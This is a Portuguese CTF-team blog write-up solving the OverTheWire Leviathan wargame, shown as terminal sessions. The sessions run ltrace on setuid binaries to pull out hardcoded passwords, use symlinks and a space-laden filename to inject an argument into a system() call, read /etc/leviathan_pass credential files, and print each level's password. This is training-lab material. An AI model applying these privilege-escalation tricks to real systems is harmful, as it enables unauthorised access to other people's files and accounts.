<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>Write-Up - OverTheWire - Leviathan</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="n00bsb Brazilian ctf-team">
    <meta name="author" content="n00bsbot">

    <!-- Styles -->
    <link rel="stylesheet" href="../../theme/css/n00bsb.css" type="text/css" />
<!--    <link href="../../theme/css/pygments.css" rel="stylesheet">  -->
    <link href='https://fonts.googleapis.com/css?family=Inconsolata' rel='stylesheet' type='text/css'>

    <!-- Favivon and touch icons -->
    <link rel="shortcut icon" href="../../theme/img/favicon.ico">
    <link rel="apple-touch-icon" href="../../theme/img/apple-touch-icon.png">
    <link rel="apple-touch-icon" sizes="72x72" href="../../theme/img/apple-touch-icon-72x72.png">
    <link rel="apple-touch-icon" sizes="114x114" href="../../theme/img/apple-touch-icon-114x114.png">
  </head>

  <body>
    <div class="navbar navbar-fixed-top">
      <div class="navbar-inner">
        <div class="container-fluid">
          <div class="nav-collapse">
            <ul class="nav">
              <li class="nav pull-left"><a href="../../sobre.html">Sobre</a></li>
              <li class="nav pull-left"><a href="../../archives.html">Archive</a></li>
              <li ><a href="../../category/ctf.html">CTF</a></li>
              <li class="active"><a href="../../category/wargames.html">Wargames</a></li>
              <!-- <ul class="nav pull-right"> -->
              <!-- </ul -->
            </ul>
          </div><!--/.nav-collapse -->
        </div>
      </div>
    </div>

    <div class="container-fluid">
<div>
    <br>
    <a class="ascii-logo" href="../../index.html">
        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.d8888b.&nbsp;&nbsp;.d8888b.&nbsp;888&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;888&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;d88P&nbsp;&nbsp;Y88bd88P&nbsp;&nbsp;Y88b888&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;888&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;888&nbsp;&nbsp;&nbsp;&nbsp;888888&nbsp;&nbsp;&nbsp;&nbsp;888888&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;888&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
        88888b.&nbsp;888&nbsp;&nbsp;&nbsp;&nbsp;888888&nbsp;&nbsp;&nbsp;&nbsp;88888888b.&nbsp;.d8888b&nbsp;88888b.&nbsp;&nbsp;<br>
        888&nbsp;"88b888&nbsp;&nbsp;&nbsp;&nbsp;888888&nbsp;&nbsp;&nbsp;&nbsp;888888&nbsp;"88b88K&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;888&nbsp;"88b&nbsp;<br>
        888&nbsp;&nbsp;888888&nbsp;&nbsp;&nbsp;&nbsp;888888&nbsp;&nbsp;&nbsp;&nbsp;888888&nbsp;&nbsp;888"Y8888b.888&nbsp;&nbsp;888&nbsp;<br>
        888&nbsp;&nbsp;888Y88b&nbsp;&nbsp;d88PY88b&nbsp;&nbsp;d88P888&nbsp;d88P&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;X88888&nbsp;d88P&nbsp;<br>
        888&nbsp;&nbsp;888&nbsp;"Y8888P"&nbsp;&nbsp;"Y8888P"&nbsp;88888P"&nbsp;&nbsp;88888P'88888P"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Brazilian CTF Team<br>
    </a>
<br><br>
</div>      <div class="row">
        <div class="span9" id="content">
<section id="content">
        <article>
                <header>
                        <h2>
                                <a href=""
                                        rel="bookmark"
                                        title="Permalink to Write-Up - OverTheWire - Leviathan">
                                        Write-Up - OverTheWire - Leviathan
                                </a>
                        </h2>
                </header>
                <div class="entry-content">
                <div class="well">
<footer class="post-info">
<span class="label">Data</span>
<abbr class="published" title="27/03/2016">
    27/03/2016
</abbr>
    <span class="label">Por</span>
    <a href="#">atcasanova</a>
<span class="label">Categoria</span>
<a href="../../category/wargames.html">Wargames</a>

    <span class="label">Tags</span>
	    <a href="../../tag/overthewireorg.html">#overthewire.org</a>
	    <a href="../../tag/wargames.html">#wargames</a>
	    <a href="../../tag/write-up.html">#write-up</a>

</footer><!-- /.post-info -->                </div>
                <p>Seguindo a sequência do OverTheWire, vamos começar aqui o <a href="http://overthewire.org/wargames/leviathan/">Leviathan</a>.<br />
Tem bem menos níveis que o Bandit. Como é relativamente simples, vou guardar comentários só pra quando for necessário. A leitura dos comandos deverá ser auto-explicativa.</p>
<h2>Level 0</h2>
<div class="codehilite" style="background: #202020"><pre style="line-height: 125%"><span></span>leviathan0@melinda:~$ ls
leviathan0@melinda:~$ ls -latrh
total 24K
-rw-r--r--   1 root       root        675 Apr  9  2014 .profile
-rw-r--r--   1 root       root       3.6K Apr  9  2014 .bashrc
-rw-r--r--   1 root       root        220 Apr  9  2014 .bash_logout
drwxr-xr-x   3 root       root       4.0K Nov 14  2014 .
drwxr-xr-x 167 root       root       4.0K Jul  9  2015 ..
drwxr-x---   3 leviathan1 leviathan0 4.0K Mar  8 21:29 .backup
leviathan0@melinda:~$ cd .backup/
leviathan0@melinda:~/.backup$ ls
bookmarks.html  wget123
leviathan0@melinda:~/.backup$ ls -R
.:
bookmarks.html  wget123

./wget123:
leviathan0@melinda:~/.backup$ cat bookmarks.html | grep leviathan
&lt;DT&gt;&lt;A HREF=&quot;http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is rioGegei8m&quot; ADD_DATE=&quot;1155384634&quot; LAST_CHARSET=&quot;ISO-8859-1&quot; ID=&quot;rdf:#$2wIU71&quot;&gt;password to leviathan1&lt;/A&gt;
</pre></div>


<h2>Level 1</h2>
<div class="codehilite" style="background: #202020"><pre style="line-height: 125%"><span></span>leviathan0@melinda:~/.backup$ ssh leviathan1@localhost
leviathan1@melinda:~$ ls
check
leviathan1@melinda:~$ file check 
check: setuid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0d17ae20f672ebc7d440bb4562277561cc60f2d0, not stripped
leviathan1@melinda:~$ ltrace ./check
__libc_start_main(0x804852d, 1, 0xffffd674, 0x80485f0 &lt;unfinished ...&gt;
printf(&quot;password: &quot;)                                                                                                      = 10
getchar(0x8048680, 47, 0x804a000, 0x8048642password: abcde
)                                                                              = 97
getchar(0x8048680, 47, 0x804a000, 0x8048642)                                                                              = 98
getchar(0x8048680, 47, 0x804a000, 0x8048642)                                                                              = 99
strcmp(&quot;abc&quot;, &quot;sex&quot;)                                                                                                      = -1
puts(&quot;Wrong password, Good Bye ...&quot;Wrong password, Good Bye ...
)                                                                                      = 29
+++ exited (status 0) +++
leviathan1@melinda:~$ ./check
password: sex
$ ls /etc/leviathan_pass                                      
leviathan0  leviathan1  leviathan2  leviathan3  leviathan4  leviathan5  leviathan6  leviathan7
$ cat /etc/leviathan_pass/leviathan2
ougahZi8Ta
$ exit
</pre></div>


<h2>Level 2</h2>
<div class="codehilite" style="background: #202020"><pre style="line-height: 125%"><span></span>leviathan1@melinda:~$ ssh leviathan2@localhost
leviathan2@melinda:~$ ls
printfile
leviathan2@melinda:~$ file printfile 
printfile: setuid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=d765b4023e214e3fbfe71aa63554713a57e39520, not stripped
leviathan2@melinda:~$ ./printfile 
*** File Printer ***
Usage: ./printfile filename
leviathan2@melinda:~$ touch /tmp/n00bsbfile
leviathan2@melinda:~$ ltrace ./printfile /tmp/n00bsbfile
__libc_start_main(0x804852d, 2, 0xffffd654, 0x8048600 &lt;unfinished ...&gt;
access(&quot;/tmp/n00bsbfile&quot;, 4)                                                                                              = 0
snprintf(&quot;/bin/cat /tmp/n00bsbfile&quot;, 511, &quot;/bin/cat %s&quot;, &quot;/tmp/n00bsbfile&quot;)                                               = 24
system(&quot;/bin/cat /tmp/n00bsbfile&quot; &lt;no return ...&gt;
--- SIGCHLD (Child exited) ---
&lt;... system resumed&gt; )                                                                                                    = 0
+++ exited (status 0) +++
leviathan2@melinda:~$ rm /tmp/n00bsbfile
leviathan2@melinda:~$ ln -s /etc/leviathan_pass/leviathan3 /tmp/n00bsbfile
leviathan2@melinda:~$ touch /tmp/n00bsbfile\ blabla
leviathan2@melinda:~$ ./printfile /tmp/n00bsbfile\ blabla
Ahdiemoo1j
/bin/cat: blabla: No such file or directory
</pre></div>


<h2>Level 3</h2>
<div class="codehilite" style="background: #202020"><pre style="line-height: 125%"><span></span>leviathan3@melinda:~$ ls -latrh
total 32K
-rw-r--r--   1 root       root        675 Apr  9  2014 .profile
-rw-r--r--   1 root       root       3.6K Apr  9  2014 .bashrc
-rw-r--r--   1 root       root        220 Apr  9  2014 .bash_logout
-r-sr-x---   1 leviathan4 leviathan3 9.8K Mar 21  2015 level3
drwxr-xr-x   2 root       root       4.0K Mar 21  2015 .
drwxr-xr-x 167 root       root       4.0K Jul  9  2015 ..
leviathan3@melinda:~$ file level3 
level3: setuid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=9ee1bc84cc2a39de9df95a77cb807136b1ba6db2, not stripped
leviathan3@melinda:~$ ./level3 
Enter the password&gt; abc
bzzzzzzzzap. WRONG
leviathan3@melinda:~$ ltrace ./level3
__libc_start_main(0x80485fe, 1, 0xffffd674, 0x80486d0 &lt;unfinished ...&gt;
strcmp(&quot;h0no33&quot;, &quot;kakaka&quot;)                                                                                                = -1
printf(&quot;Enter the password&gt; &quot;)                                                                                            = 20
fgets(Enter the password&gt; bla
&quot;bla\n&quot;, 256, 0xf7fcbc20)                                                                                           = 0xffffd46c
strcmp(&quot;bla\n&quot;, &quot;snlprintf\n&quot;)                                                                                            = -1
puts(&quot;bzzzzzzzzap. WRONG&quot;bzzzzzzzzap. WRONG
)                                                                                                = 19
+++ exited (status 0) +++
leviathan3@melinda:~$ ./level3
Enter the password&gt; snlprintf
[You&#39;ve got shell]!
$ whoami
leviathan4
$ cat /etc/leviathan_pass/leviathan4
vuH0coox6m
$ exit
</pre></div>


<h2>Level 4</h2>
<div class="codehilite" style="background: #202020"><pre style="line-height: 125%"><span></span>leviathan4@melinda:~$ ls
leviathan4@melinda:~$ ls -latrh
total 24K
-rw-r--r--   1 root root        675 Apr  9  2014 .profile
-rw-r--r--   1 root root       3.6K Apr  9  2014 .bashrc
-rw-r--r--   1 root root        220 Apr  9  2014 .bash_logout
drwxr-xr-x   3 root root       4.0K Nov 14  2014 .
dr-xr-x---   2 root leviathan4 4.0K Nov 14  2014 .trash
drwxr-xr-x 167 root root       4.0K Jul  9  2015 ..
leviathan4@melinda:~$ cd .trash/
leviathan4@melinda:~/.trash$ ls
bin
leviathan4@melinda:~/.trash$ file bin 
bin: setuid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=3be0f50b480c24c4223fc43cca29ab377e140fc7, not stripped
leviathan4@melinda:~/.trash$ ./bin
01010100 01101001 01110100 01101000 00110100 01100011 01101111 01101011 01100101 01101001 00001010
leviathan4@melinda:~/.trash$ for i in $(./bin); do echo -n $(printf \\$(echo &quot;ibase=2; obase=8; $i&quot; | bc)) ; done; echo
Tith4cokei
</pre></div>


<h2>Level 5</h2>
<div class="codehilite" style="background: #202020"><pre style="line-height: 125%"><span></span>leviathan5@melinda:~$ ls
leviathan5
leviathan5@melinda:~$ file leviathan5 
leviathan5: setuid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=c71b3ae0d0395851879ee6fb8ede92e1676ecf71, not stripped
leviathan5@melinda:~$ ./leviathan5 
Cannot find /tmp/file.log
leviathan5@melinda:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
leviathan5@melinda:~$ ./leviathan5 
UgaoFee4li
</pre></div>


<h2>Level 6</h2>
<div class="codehilite" style="background: #202020"><pre style="line-height: 125%"><span></span>leviathan6@melinda:~$ ls
leviathan6
leviathan6@melinda:~$ file leviathan6 
leviathan6: setuid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=477bdc2883903e1a94b335e173c9149bc2755ab8, not stripped
leviathan6@melinda:~$ ./leviathan6 
usage: ./leviathan6 &lt;4 digit code&gt;
Wrong
Wrong
(...)
$ whoami
leviathan7
$ cat /etc/leviathan_pass/leviathan7
ahy7MaeBo9
$ exit
Wrong
^C
leviathan6@melinda:~$ ssh leviathan7@localhost
leviathan7@melinda:~$ ls -latrh
total 24K
-rw-r--r--   1 root       root        675 Apr  9  2014 .profile
-rw-r--r--   1 root       root       3.6K Apr  9  2014 .bashrc
-rw-r--r--   1 root       root        220 Apr  9  2014 .bash_logout
-r--r-----   1 leviathan7 leviathan7  178 Nov 14  2014 CONGRATULATIONS
drwxr-xr-x   2 root       root       4.0K Nov 14  2014 .
drwxr-xr-x 167 root       root       4.0K Jul  9  2015 ..
leviathan7@melinda:~$ cat CONGRATULATIONS 
Well Done, you seem to have used a *nix system before, now try something more serious.
(Please don&#39;t post writeups, solutions or spoilers about the games on the web. Thank you!)
</pre></div>
                </div><!-- /.entry-content -->
        </article>
</section>
        </div><!--/span-->
        <div class="span3 well sidebar-nav" id="sidebar">
<ul class="nav nav-list">
<li class="nav-header"><h4>Membros</h4></li>
    <li><a target="_blank" href="https://github.com/atcasanova">atcasanova</a></li>
    <li><a target="_blank" href="https://github.com/deadc">deadcow</a></li>
    <li><a target="_blank" href="https://github.com/fallc0nn">fallc0nn</a></li>
    <li><a target="_blank" href="https://">kirah</a></li>
    <li><a target="_blank" href="https://github.com/ualvesdias">Odysseus</a></li>
<li class="nav-header"><h4>Links</h4></li>
    <li><a target="_blank" href="https://asciinema.org/~fallc0nn">Asciinema (fallc0nn)</a></li>
    <li><a target="_blank" href="https://ctftime.org/team/24500">CTF-Time</a></li>
    <li><a target="_blank" href="https://github.com/n00bsb">Github</a></li>

<li class="nav-header"><h4>Categorias</h4></li>
<li><a href="../../category/ctf.html">CTF</a></li>
<li><a href="../../category/wargames.html">Wargames</a></li>

<li class="nav-header"><h4></i>Tags</h4></li>
<li class="tag-[<pelican.contents.Article object at 0x7f0bda049a50>]"><a href="../../tag/ctf.html">#ctf</a></li>
<li class="tag-[<pelican.contents.Article object at 0x7f0bda015dd0>, <pelican.contents.Article object at 0x7f0bd9f7be50>]"><a href="../../tag/overthewireorg.html">#overthewire.org</a></li>
<li class="tag-[<pelican.contents.Article object at 0x7f0bda049a50>]"><a href="../../tag/sctf.html">#sctf</a></li>
<li class="tag-[<pelican.contents.Article object at 0x7f0bda015dd0>, <pelican.contents.Article object at 0x7f0bd9f7be50>]"><a href="../../tag/wargames.html">#wargames</a></li>
<li class="tag-[<pelican.contents.Article object at 0x7f0bda049a50>, <pelican.contents.Article object at 0x7f0bda015dd0>, <pelican.contents.Article object at 0x7f0bd9f7be50>]"><a href="../../tag/write-up.html">#write-up</a></li>

</ul>        </div><!--/.well -->
      </div><!--/row-->

      <footer></footer>
    
    </div><!--/.fluid-container-->
  </body>
</html>